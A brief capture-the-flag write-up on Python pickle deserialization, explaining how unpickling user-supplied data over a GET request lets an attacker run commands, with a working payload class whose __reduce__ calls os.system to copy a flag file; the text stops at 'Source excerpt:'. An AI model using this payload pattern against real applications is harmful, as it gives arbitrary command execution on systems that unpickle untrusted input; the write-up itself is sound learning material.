CTFd — Pickle!

Learnt about object serialization today. Serialization is a way to convert objects into binary to store them and then deserialize to render the data back as an object.

This CTF problem was a serialization problem in python3, hence, the name  - pickle is the python serialization library.

The idea is that if you know you know an application is going to pickle and unpickle some data and the unpickling happens over a GET request then the user has unrestricted access and can give ‘pickled’ commands to the web application to unpickle and run

For example:

import pickle

import os

class Evil(object):

   def __reduce__(self):

       return (os.system, ('cp /flag.txt notes/flag.txt', ))

pickle_data = pickle.dumps(Evil())

with open('payload', 'wb') as f:

   f.write(pickle_data)

The above command would upon unpickling, execute

cp  /flag.txt  notes/flag.txt

That was the case with this CTF challenge. Source excerpt:
